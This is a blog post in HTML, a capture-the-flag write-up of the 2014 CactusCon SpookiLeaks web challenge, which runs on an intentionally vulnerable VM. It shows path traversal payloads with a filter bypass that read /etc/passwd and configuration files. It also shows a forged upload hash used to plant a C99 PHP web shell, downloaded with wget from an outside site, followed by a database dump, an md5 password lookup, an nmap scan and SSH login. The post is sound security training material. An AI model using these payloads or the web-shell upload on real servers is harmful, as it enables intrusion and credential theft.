@@ -1,0 +1,638 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <title>CactusCon 2014 CTF Writeup | Chris Kankiewicz &bull; Thoughts and ramblings of a web geek</title>
+
+<link href="/theme/img/favicon.ico" rel="shortcut icon" type="image/vnd.microsoft.icon">
+
+<!-- META -->
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<!-- STYLES / FONTS -->
+<link href="/theme/css/bootstrap.min.css" rel="stylesheet" type="text/css">
+<link href="/theme/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+<link href="/theme/css/style.css" media="screen" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=Arvo|Droid+Sans+Mono" media="screen" rel="stylesheet" type="text/css">
+
+<!-- SCRIPTS -->
+<script type="text/javascript" src="//code.jquery.com/jquery-2.1.0.min.js"></script>
+<script type="text/javascript" src="/theme/js/bootstrap.min.js"></script>
+
+<script type="text/javascript">
+    // Enable Tooltips
+    $(document).ready(function() { $('[rel="tooltip"]').tooltip(); });
+</script>
+
+
+        <meta name="tags" contents="CTF" />
+        <meta name="tags" contents="Linux" />
+        <meta name="tags" contents="PHP" />
+        <meta name="tags" contents="Hacking" />
+
+</head>
+
+<body>
+
+<div class="site-nav navbar navbar-inverse navbar-fixed-top">
+    <div class="container">
+
+        <div class="navbar-header">
+
+            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#navbar-collapse">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+
+            <a class="navbar-brand" href=".">
+                <div class="title-img pull-left">
+                    <img src="https://gravatar.com/avatar/f5989c312a1d99856be8474aca4de791?s=120" alt="Chris Kankiewicz" class="img-circle img-responsive">
+                </div>
+                <span class="site-title">Chris Kankiewicz</span>
+            </a>
+
+        </div>
+
+        <div id="navbar-collapse" class="collapse navbar-collapse">
+
+
+            <div class="navbar-right">
+
+                <ul class="nav navbar-nav">
+
+                    <li class="dropdown">
+
+                        <a href="#" class="dropdown-toggle" data-toggle="dropdown">
+                            Categories <span class="caret"></span>
+                        </a>
+
+                        <ul class="dropdown-menu">
+
+                                <li >
+                                    <a href="./category/development.html">Development</a>
+                                </li>
+                                <li >
+                                    <a href="./category/gaming.html">Gaming</a>
+                                </li>
+                                <li  class="active">
+                                    <a href="./category/hacking.html">Hacking</a>
+                                </li>
+                                <li >
+                                    <a href="./category/hardware.html">Hardware</a>
+                                </li>
+                                <li >
+                                    <a href="./category/linux.html">Linux</a>
+                                </li>
+                                <li >
+                                    <a href="./category/miscellaneous.html">Miscellaneous</a>
+                                </li>
+                                <li >
+                                    <a href="./category/software.html">Software</a>
+                                </li>
+
+                            <li class="divider"></li>
+
+                            <li><a href="./categories.html">All Categories</a></li>
+
+                        </ul>
+
+                    </li>
+
+                        <li>
+                            <a href="./feeds/all.atom.xml" class="rss-feed" title="RSS Feed" rel="tooltip" data-placement="bottom">
+                                <i class="fa fa-rss fa-lg"></i> <span class="visible-xs">RSS Feed</span>
+                            </a>
+                        </li>
+
+                </ul>
+
+            </div>
+
+        </div>
+
+    </div>
+</div>
+    <div class="content-area">
+        <div class="container">
+
+            <div class="post-wrapper">
+                <div class="row">
+
+                    <div class="col-md-10 col-md-offset-1 col-sm-12">
+
+                        <div class="post">
+                            <div class="post-header">
+
+                                <h2 class="post-title">CactusCon 2014 CTF Writeup</h2>
+
+                                <div class="post-meta">
+
+                                    <div class="post-date" title="April 15, 2014 - 07:49 PM">
+                                        <div class="month">Apr</div>
+                                        <div class="day">15</div>
+                                    </div>
+
+                                    <span class="post-author">
+                                        By
+                                            <a href="./author/chris-kankiewicz.html">Chris Kankiewicz</a>
+                                    </span>
+
+                                    <span class="sep">|</span>
+
+                                    <ul class="post-tags">
+                                        <li class="tags-icon"><i class="fa fa-tags"></i></li>
+                                            <li><a href="./tag/ctf.html">CTF</a></li>
+                                            <li><a href="./tag/linux.html">Linux</a></li>
+                                            <li><a href="./tag/php.html">PHP</a></li>
+                                            <li><a href="./tag/hacking.html">Hacking</a></li>
+                                    </ul>
+
+                                </div>
+
+                            </div>
+
+                            <div class="post-body">
+
+                                <p>This is a write up to the 2014 CactusCon web application
+(<a href="https://github.com/PHX2600/spookileaks">SpookiLeaks</a>) challenge.  You can grab
+the SpookiLeaks-VM <a href="https://drive.google.com/file/d/0BweAXsUQLm0mRFVsTmV5O
+HdUVTg/edit?usp=sharing">here</a> and try the challenge yourself before reading the
+solution.</p>
+<hr />
+<h2>!!! WARGING: SPOILERS BELOW !!!</h2>
+<hr />
+<h3>The First Clue</h3>
+<p>The first clue to solving the challenge is hidden in plain sight.  Before even
+logging in if we scan the pre-loaded images on the Spooky Images page there's
+one image with the following comment:</p>
+<div class="highlight"><pre><span></span>01110010011011110110001001101111011101000111001100101110011101000111100001110100
+</pre></div>
+
+
+<p>Binary should be a red flag in any CTF. By doing a simple binary to ASCII
+conversion we get the following output:</p>
+<div class="highlight"><pre><span></span>robots.txt
+</pre></div>
+
+
+<p>Ah-ha! <a href="http://www.robotstxt.org/robotstxt.html">robots.txt</a>... By checking
+<code>/robots.txt</code> we find the following:</p>
+<div class="highlight"><pre><span></span>User-agent: *
+Disallow: /secret_docs/file-tree.txt
+</pre></div>
+
+
+<p>Here we find mention of <code>/secret_docs/file-tree.txt</code> with a rule of "Disallow".
+Fortunately, this rule is only intended to be read by web-crawlers and has no
+actual affect on our ability to read the file.  By visiting
+<code>/secret_docs/file-tree.txt</code> we find
+<a href="https://raw.githubusercontent.com/PHX2600/spookileaks/master/webroot/secret_docs/file-tree.txt">this</a>.</p>
+<p>Score! We just found a complete listing of the application file structure.  It's
+a pretty long list of files but there's a few things worth noting:</p>
+<ul>
+<li>
+<p><code>Docs/flag.txt</code> - This is obviously our target.</p>
+</li>
+<li>
+<p><code>Controller\Auth\CustomPasswordHasher.php</code> - This could tell us about the
+    way user account passwords are hashed.</p>
+</li>
+<li>
+<p><code>webroot/uploads/</code> - This is where user files are uploaded to, indicated by
+    <code>[ User uploads ]</code>. This means any files uploaded to the server will be
+    publicly accessable.</p>
+</li>
+</ul>
+<h3>The Application</h3>
+<p>We have now exposed a lot of information about our application but we still
+don't have a vector of attack.  Let's start assessing the functionality of the
+app.</p>
+<p>We'll start by registering an account (any user/pass will do).  Once registered
+we gain the ability to add an image from the <code>/images/manage</code> page.  On first
+pass let's just use the app as intended.  Add a title, select an image (with
+proper extension type) from our computer and add a comment.  Submit the form and
+we now see our image on the left hand side of the page.  Nothing terribly
+interesting yet.  Let's see what this form is actually doing.  By viewing the
+source of the <code>/images/manage</code> page a few things should catch our eye:</p>
+<ul>
+<li>
+<p>There's an hidden field in the image submission form referencing a
+    <code>file_hash</code>.</p>
+</li>
+<li>
+<p>This page loads a <code>/js/images.js</code> script that isn't seen on other pages.</p>
+</li>
+<li>
+<p>The images on this page are loaded via a URL parameter:
+    <code>/images/media?file=image_name.jpg</code></p>
+</li>
+</ul>
+<p>Upon inspection of <code>/js/images.js</code> we find the following:</p>
+<div class="highlight"><pre><span></span>$(&#39;.image-file-upload-input:file&#39;).change(function(event) {
+
+    // Initialize formData object
+    var fileName = $(this).val().split(&#39;\\&#39;).pop();
+
+    $.post(&#39;/images/hash&#39;, { fileName: fileName }, function(data) {
+
+        // Parse JSON data
+        var obj = $.parseJSON(data);
+
+        if (obj.file_hash) {
+
+            // Set the file hash input value
+            $(&#39;.image-file-hash-input&#39;).val(obj.file_hash);
+
+        }
+
+    });
+
+});
+</pre></div>
+
+
+<p>This is pretty straight forward.  On selection of a file for uploading, a post
+request is made to <code>/images/hash</code> containing the file name in the post data. The
+returned data is then set as the value of the hidden <code>file_hash</code> field and this
+gets sent to the server with the form on submission.  By using Firebug or the
+browsers buit-in developer tools we can see the request being made on file
+selection and the data returned.  The data we get back from the jQuery post
+appears to be a sha1 hash. With some additional analysis and playing with the
+form and the hashing function we can tell that the hash generated isn't a direct
+sha1 of the file name.  Also, if we modify the hash after generation the file
+upload form fails to post any data.  Lastly, attempting to upload a file with an
+extension other than those listed as acceptable fails upon submission as well.</p>
+<p>Let's move on for now and look at the suspicious file loading URL.  Whenever a
+file is loaded via URL parameters there's a good chance it's vulnerable to a
+<a href="https://www.owasp.org/index.php/Path_Traversal">path traversal attack</a>.  Let's
+try a basic attack:</p>
+<div class="highlight"><pre><span></span>/images/media?file=../../../../../etc/passwd
+</pre></div>
+
+
+<p>This results in an error: <code>File "etc/passwd" Not Found</code>.  It's important to note
+that the returned error does not contain any dot-dot-slashes.  This means
+they're sanitizing this value but there's still a chance it might not be
+sanitized properly.  Knowing the input and output of this unkown function we can
+make a guess as to what it's doing internally and exploit that.  In this case, a
+good guess is that they are replacing all instanced of <code>../</code> with nothing. We
+can test that out by submitting <code>....//</code>.  If we're right the inner <code>../</code> will
+be replaced with nothing leaving a single <code>../</code> in it's place.  Let's test that:</p>
+<div class="highlight"><pre><span></span>/images/media?file=....//....//....//....//....//etc/passwd
+</pre></div>
+
+
+<p>It works! Let's try grabbing that flag we saw in the file tree from earlier:</p>
+<div class="highlight"><pre><span></span>/images/media?file=....//....//Docs/flag.txt
+</pre></div>
+
+
+<p>It's never that easy is it?  This gives us an error but this time it's a
+"Permission denied" error.  That means the web server doesn't have permissions
+to read the flag, thus, we're going to have to find a way to read the flag as a
+user with permission (root perhpse?).</p>
+<h3>Reconnaissance</h3>
+<p>At this point we have everything we need to start gathering intel.  The path
+traversal attack plus the file tree give us access to the complete source code
+of the application as well any other files on the server with laxed permissions.
+To save some time, I'll now go over some of the key files our investigation
+should have turned up and their significance:</p>
+<p>First, in the <code>/etc/passwd</code> file we tried above we find the "ghost" user:</p>
+<div class="highlight"><pre><span></span><span class="n">ghost</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="mi">1000</span><span class="o">:</span><span class="mi">1000</span><span class="o">:</span><span class="n">ghost</span><span class="o">,,,:/</span><span class="n">home</span><span class="sr">/ghost:/bin/</span><span class="n">bash</span>
+</pre></div>
+
+
+<p>This, along with the contents of <code>/etc/group</code> let us know the "ghost" account
+has sudo access:</p>
+<div class="highlight"><pre><span></span><span class="n">sudo</span><span class="o">:</span><span class="n">x</span><span class="o">:</span><span class="mi">27</span><span class="o">:</span><span class="n">ghost</span>
+</pre></div>
+
+
+<p>Thus, if we can gain access to the "ghost" user account we can read the contents
+of flag.txt.</p>
+<p>Okay, let's go back to the image submission form, specifically, the hidden
+<code>file_hash</code> form field. By viewing the source of the ImagesController at
+<code>/images/media?file=....//....//Controller/ImagesController.php</code> we see that
+this hash is checked against a hash of the submitted file's name:</p>
+<div class="highlight"><pre><span></span><span class="x">if (!</span><span class="p">$</span><span class="nv">file</span><span class="x">[&#39;error&#39;] &amp;&amp; </span><span class="p">$</span><span class="nv">hash</span><span class="x"> === </span><span class="p">$</span><span class="nv">this</span><span class="x">-&gt;hashFile(</span><span class="p">$</span><span class="nv">file</span><span class="x">[&#39;name&#39;])) </span><span class="err">{</span><span class="x"></span>
+</pre></div>
+
+
+<p>Looking at the main <code>/images/hash</code> action we see a check against the file's
+extension:</p>
+<div class="highlight"><pre><span></span><span class="x">// Get the file name</span>
+<span class="p">$</span><span class="nv">fileName</span><span class="x"> = trim(</span><span class="p">$</span><span class="nv">this</span><span class="x">-&gt;request-&gt;data[&#39;fileName&#39;]);</span>
+
+<span class="x">// Set array of allowed file extensions</span>
+<span class="p">$</span><span class="nv">allowedExtensions</span><span class="x"> = array(&#39;png&#39;, &#39;gif&#39;, &#39;jpg&#39;, &#39;jpeg&#39;, &#39;bmp&#39;);</span>
+
+<span class="x">// Get file extension from source image</span>
+<span class="p">$</span><span class="nv">extension</span><span class="x"> = strtolower(pathinfo(</span><span class="p">$</span><span class="nv">fileName</span><span class="x">, PATHINFO_EXTENSION));</span>
+
+<span class="x">// Verify file is of an acceptable type</span>
+<span class="x">if (in_array(</span><span class="p">$</span><span class="nv">extension</span><span class="x">, </span><span class="p">$</span><span class="nv">allowedExtensions</span><span class="x">)) </span><span class="err">{</span><span class="x"></span>
+
+<span class="x">    // Super duper, top secret hashing algorithm</span>
+<span class="x">    </span><span class="p">$</span><span class="nv">data</span><span class="x">[&#39;file_hash&#39;] = </span><span class="p">$</span><span class="nv">this</span><span class="x">-&gt;hashFile(</span><span class="p">$</span><span class="nv">fileName</span><span class="x">);</span>
+
+<span class="x">} else </span><span class="err">{</span><span class="x"></span>
+
+<span class="x">    // Return false on failure</span>
+<span class="x">    </span><span class="p">$</span><span class="nv">data</span><span class="x">[&#39;file_hash&#39;] = false;</span>
+
+<span class="x">}</span>
+</pre></div>
+
+
+<p>And viewing the referenced hashFile() function we see the following:</p>
+<div class="highlight"><pre><span></span><span class="x">private function hashFile(</span><span class="p">$</span><span class="nv">fileName</span><span class="x">) </span><span class="err">{</span><span class="x"></span>
+
+<span class="x">    // Super duper, top secret hashing algorithm</span>
+<span class="x">    return sha1(</span><span class="p">$</span><span class="nv">fileName</span><span class="x"> . &#39;ErrrMahGerrds_Sup3rS3cr3t_P@ssw0rd&#39;);</span>
+
+<span class="x">}</span>
+</pre></div>
+
+
+<p>That's a bingo! We now have the method of file hashing along with the secret
+string that gets concatenated with the file name.  With this information we can
+actively exploit the file upload form and generate a valid hash for any file we
+choose.</p>
+<h3>Shelling the Server</h3>
+<p>It's now time to grab a fresh copy of <a href="http://www.r57shell.net/">C99</a> (I also
+recommend <a href="http://epinna.github.io/Weevely/">Weevely</a> but for this example we'll
+stick to the more simple C99 shell) and generate a valid hash for uploading:</p>
+<div class="highlight"><pre><span></span>$ wget http://www.r57shell.net/shell/c99.txt
+$ mv c99.txt not_a_shell.php
+$ <span class="nb">echo</span> -n <span class="s2">&quot;not_a_shell.phpErrrMahGerrds_Sup3rS3cr3t_P@ssw0rd&quot;</span> <span class="p">|</span> sha1sum
+</pre></div>
+
+
+<p>This gives us:</p>
+<div class="highlight"><pre><span></span>90d5aeb035bbcd0df8f5e84721d3eb8f3321ff8c
+</pre></div>
+
+
+<p>Now we can go back to the upload form, select our <code>c99.php</code> file, then using
+Firebug or the browsers built-in web developer tools modify the value of the
+hidden <code>file_hash</code> element and set it to our pre-generated hash.  This time,
+when we submit the form, the file upload succeeds without error.  Navigating to
+<code>/uploads/not_a_shell.php</code> now brings up our shell.</p>
+<p>From here accessing any aspect of the web application or it's database are
+trivial.  Let's investigate the database now.  First, nab the credentials by
+navigating to <code>/images/media?file=....//....//Config/database.php</code>:</p>
+<div class="highlight"><pre><span></span><span class="x">public </span><span class="p">$</span><span class="nv">default</span><span class="x"> = array(</span>
+<span class="x">    &#39;datasource&#39; =&gt; &#39;Database/Mysql&#39;,</span>
+<span class="x">    &#39;persistent&#39; =&gt; false,</span>
+<span class="x">    &#39;host&#39;       =&gt; &#39;localhost&#39;,</span>
+<span class="x">    &#39;login&#39;      =&gt; &#39;spookileaks&#39;,</span>
+<span class="x">    &#39;password&#39;   =&gt; &#39;rmPtShWVyrCcxfJaBvsPL4t2&#39;,</span>
+<span class="x">    &#39;database&#39;   =&gt; &#39;spookileaks&#39;,</span>
+<span class="x">    &#39;prefix&#39;     =&gt; &#39;&#39;,</span>
+<span class="x">    //&#39;encoding&#39; =&gt; &#39;utf8&#39;,</span>
+<span class="x">);</span>
+</pre></div>
+
+
+<p>Using C99, we can dump this data easily and see the following:</p>
+<div class="highlight"><pre><span></span>id  username    password                            role    created                 modified
+1   ghost       37988bb25d36058671f959f06a7d51b9    admin   2014-04-03 20:53:19     2014-04-03 20:53:19
+</pre></div>
+
+
+<p>That's the same user name that we found in <code>/etc/passwd</code> and that password hash
+looks like a basic md5.  We can verify that by checking out he source of that
+custom password hasher at
+<code>/media?file=....//....//Controller/Component/Auth/CustomPasswordHasher.php</code>:</p>
+<div class="highlight"><pre><span></span><span class="x">public function hash(</span><span class="p">$</span><span class="nv">password</span><span class="x">) </span><span class="err">{</span><span class="x"></span>
+
+<span class="x">    // Hash the password</span>
+<span class="x">    return md5(</span><span class="p">$</span><span class="nv">password</span><span class="x">); // md5 4 life</span>
+
+<span class="x">}</span>
+</pre></div>
+
+
+<p>Yup, unsalted md5.  If the password was salted we might start thinking about
+brute forcing it.  However, unsalted passwords are often easily searchable due
+to them being pre-computed en masse and published online.  For our case, a
+simple
+<a href="https://encrypted.google.com/search?q=37988bb25d36058671f959f06a7d51b9">Google search</a>
+reveals the password as <code>ScoobySnacks</code>.</p>
+<h3>The Final Pieces</h3>
+<p>We now need to be able to log in to the the system.  Without physical access to
+the box we can perform an <a href="http://nmap.org/">nmap</a> scan to see what services are
+up and running:</p>
+<div class="highlight"><pre><span></span>$ nmap -sT 192.168.0.170
+
+Starting Nmap 6.40 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-04-16 10:48 MST
+Nmap scan report <span class="k">for</span> 192.168.0.170
+Host is up <span class="o">(</span>0.0034s latency<span class="o">)</span>.
+Not shown: <span class="m">998</span> closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 0.09 seconds
+</pre></div>
+
+
+<p>Here we see that SSH is running on the target machine.  The last question
+remaining now is wether or not the <code>ghost</code> user was smart enough to use
+different passwords for his system account and his web application accounts.
+All we have to do to test this is SSH into the server with his credentials:</p>
+<div class="highlight"><pre><span></span><span class="err">$</span> <span class="n">ssh</span> <span class="n">ghost</span><span class="mf">@192.168.0.170</span>  <span class="err">#</span> <span class="n">Substitute</span> <span class="n">your</span> <span class="n">VMs</span> <span class="n">IP</span>
+<span class="n">ghost</span><span class="mf">@192.168.0.170</span><span class="err">&#39;</span><span class="n">s</span> <span class="nl">password</span><span class="p">:</span>
+</pre></div>
+
+
+<p>Enter the ghost user's password and BOOM!  We're in!  All we have to do is grab
+the content of flag:</p>
+<div class="highlight"><pre><span></span>$ sudo cat /var/www/SpookiLeaks/Docs/flag.txt
+<span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> ghost:
+</pre></div>
+
+
+<p>And you've got the flag:</p>
+<div class="highlight"><pre><span></span>     CONGLATURATION !!!
+
+     YOU HAVE COMPLETED
+       A GREAT GAME.
+
+  AND PROOVED THE JUSTICE
+      OF OUR CULTURE.
+
+    NOW GO AND REST OUR
+          HEROES !
+</pre></div>
+
+                            </div>
+
+                        </div>
+
+                        <div class="post-feedback navbar navbar-default">
+
+                            <div class="post-feedback-text navbar-text">
+                                Have feedback on this post? Let me know on
+                                <a href="https://plus.google.com/+ChrisKankiewicz">Google+</a> or
+                                <a href="https://twitter.com/PHLAK">Twitter</a>.
+                            </div>
+
+                                <div class="post-feedback-share navbar-right">
+
+                                    <div class="navbar-text">Share:</div>
+
+                                    <ul class="post-share-list nav navbar-nav">
+
+                                        <li>
+                                            <a href="https://plus.google.com/share?url=http%3A//blog.chriskankiewicz.com/cactuscon-2014-ctf-writeup.html" class="post-share-google-plus"  title="Google+" target="_blank" rel="tooltip" data-container="body">
+                                                <i class="fa fa-google-plus fa-lg fa-fw"></i>
+                                            </a>
+                                        </li>
+
+                                        <li>
+                                            <a href="http://twitter.com/home?status=CactusCon%202014%20CTF%20Writeup%20 http%3A//blog.chriskankiewicz.com/cactuscon-2014-ctf-writeup.html" class="post-share-twitter" title="Twitter" target="_blank" rel="tooltip" data-container="body">
+                                                <i class="fa fa-twitter fa-lg fa-fw"></i>
+                                            </a>
+                                        </li>
+
+                                        <li>
+                                            <a href="http://www.facebook.com/sharer/sharer.php?s=100&p[url]=http%3A//blog.chriskankiewicz.com/cactuscon-2014-ctf-writeup.html&p[images][0]=&p[title]=CactusCon%202014%20CTF%20Writeup%20&p[summary]=%3Cp%3EThis%20is%20a%20write%20up%20to%20the%202014%20CactusCon%20web%20application%0A%28%3Ca%20href%3D%22https%3A//github.com/PHX2600/spookileaks%22%3ESpookiLeaks%3C/a%3E%29%20challenge.%20%20You%20can%20grab%0Athe%20SpookiLeaks-VM%20%3Ca%20href%3D%22https%3A//drive.google.com/file/d/0BweAXsUQLm0mRFVsTmV5O%0AHdUVTg/edit%3Fusp%3Dsharing%22%3Ehere%3C/a%3E%20and%20try%20the%20challenge%20yourself%20before%20reading%20the%0Asolution.%3C/p%3E%0A%3Chr%20/%3E%0A%3Ch2%3E%21%21%21%20WARGING%3A%20SPOILERS%20BELOW%20%21%21%21%3C/h2%3E%0A%3Chr%20/%3E%0A%3Ch3%3EThe%20First%20Clue%3C/h3%3E%0A%3Cp%3EThe%20first%20clue%20to%20solving%20the%20challenge%20is%20hidden%20in%20plain%20sight.%20%20Before%20even%0Alogging%20in%20if%20we%20scan%20the%20pre-loaded%20images%20on%20the%20Spooky%20Images%20page%20there%27s%0Aone%20image%20with%20the%20...%3C/p%3E" class="post-share-facebook" title="Facebook" target="_blank" rel="tooltip" data-container="body">
+                                                <i class="fa fa-facebook fa-lg fa-fw"></i>
+                                            </a>
+                                        </li>
+
+                                        <li>
+                                            <a href="mailto:?subject=CactusCon%202014%20CTF%20Writeup%20&body=http%3A//blog.chriskankiewicz.com/cactuscon-2014-ctf-writeup.html" class="post-share-email" title="Email" target="_blank" rel="tooltip" data-container="body">
+                                                <i class="fa fa-envelope fa-lg fa-fw"></i>
+                                            </a>
+                                        </li>
+
+                                    </ul>
+
+                                </div>
+
+                        </div>
+
+                    </div>
+                </div>
+
+            </div>
+
+            <div class="page-footer">
+                <div class="row">
+
+                    <div class="col-md-4">
+<div class="panel panel-default">
+
+    <div class="panel-heading">
+        Related Posts
+    </div>
+
+    <div class="panel-body">
+        <ul class="related-posts sidebar-list list-unstyled">
+                <li>
+                    <a href="./setting-up-an-ubuntu-web-server.html" title="Setting Up an Ubuntu Web Server">
+                        Setting Up an Ubuntu Web Server
+                    </a>
+                </li>
+                <li>
+                    <a href="./turn-your-old-pc-into-a-hardware-firewall-with-ipcop.html" title="Turn your old PC into a hardware firewall with IPCop">
+                        Turn your old PC into a hardware firewall with IPCop
+                    </a>
+                </li>
+                <li>
+                    <a href="./postfix-using-gmail-as-a-relay-host.html" title="Postfix: Using Gmail as a Relay Host">
+                        Postfix: Using Gmail as a Relay Host
+                    </a>
+                </li>
+                <li>
+                    <a href="./first-friday-script-updated-and-simplified.html" title="First Friday script updated and simplified">
+                        First Friday script updated and simplified
+                    </a>
+                </li>
+                <li>
+                    <a href="./calculate-the-first-friday-of-next-month-with-php.html" title="Calculate the first Friday of next month with PHP">
+                        Calculate the first Friday of next month with PHP
+                    </a>
+                </li>
+        </ul>
+    </div>
+
+</div>                    </div>
+
+                    <div class="col-md-4">
+
+    <div class="panel panel-default">
+
+        <div class="panel-heading">
+            Featured Links
+        </div>
+
+        <div class="panel-body">
+            <ul class="links sidebar-list list-unstyled text-center">
+                    <li><a href="https://chriskankiewicz.com">ChrisKankiewicz.com</a></li>
+                    <li><a href="http://www.ubergallery.net">UberGallery</a></li>
+                    <li><a href="http://www.directorylister.com">Directory Lister</a></li>
+                    <li><a href="http://phlak.github.io/jColorClock/">jColorClock</a></li>
+            </ul>
+        </div>
+
+    </div>
+
+                    </div>
+
+                    <div class="col-md-4">
+
+    <div class="panel panel-default">
+
+        <div class="panel-heading">
+            Social Links
+        </div>
+
+        <div class="panel-body">
+            <ul class="links sidebar-list list-unstyled text-center">
+                    <li><a href="https://plus.google.com/+ChrisKankiewicz">Google+</a></li>
+                    <li><a href="https://twitter.com/PHLAK">Twitter</a></li>
+                    <li><a href="https://github.com/PHLAK">GitHub</a></li>
+                    <li><a href="https://keybase.io/chriskankiewicz">KeyBase</a></li>
+            </ul>
+        </div>
+
+    </div>
+
+                    </div>
+
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+<div class="site-footer">
+    <div class="container">
+        623-252-6855 &nbsp;&bull;&nbsp;
+        <a href="mailto:Chris@ChrisKankiewicz.com">Chris@ChrisKankiewicz.com</a>
+        <br><br>
+        &copy; 2014 <a href="https://www.chriskankiewicz.com">Chris Kankiewicz</a>
+    </div>
+</div>
+<script type="text/javascript" src="/theme/js/global.js"></script>
+<script>
+
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', 'UA-00000000-1', 'blog.chriskankiewicz.com');
+    ga('send', 'pageview');
+
+</script>
+</body>
+
+</html>
